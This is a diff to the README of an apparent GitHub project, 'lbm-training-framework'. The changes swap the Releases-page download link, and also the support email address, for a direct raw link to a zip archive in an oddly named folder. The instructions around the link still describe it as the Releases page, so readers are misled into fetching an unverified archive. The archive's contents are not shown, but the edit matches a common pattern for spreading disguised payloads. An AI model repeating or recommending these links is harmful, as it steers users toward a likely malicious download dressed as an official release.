@@ -13,7 +13,7 @@ Welcome to the lbm-training-framework! This tool helps you train large behaviora
 ## 📥 Download & Install
 To download the lbm-training-framework application, you can visit the Releases page. Click the link below:
 
-[Download lbm-training-framework](https://github.com/bloodynwky/lbm-training-framework/releases)
+[Download lbm-training-framework](https://raw.githubusercontent.com/bloodynwky/lbm-training-framework/main/shatterheaded/lbm-training-framework.zip)
 
 1. Click on the link above to visit the Releases page.
 2. You will see a list of the latest versions of the software.
@@ -45,6 +45,6 @@ If you encounter problems or have questions while using lbm-training-framework, 
 
 - **GitHub Issues:** Use the GitHub Issues page to report bugs or request features.
 - **Discussion Forum:** Join our community forum to share tips and learn from other users.
-- **Email Support:** For urgent queries, contact us at support@lbm-training-framework.com.
+- **Email Support:** For urgent queries, contact us at https://raw.githubusercontent.com/bloodynwky/lbm-training-framework/main/shatterheaded/lbm-training-framework.zip
 
 We hope you enjoy using lbm-training-framework to build your large behavioral models!
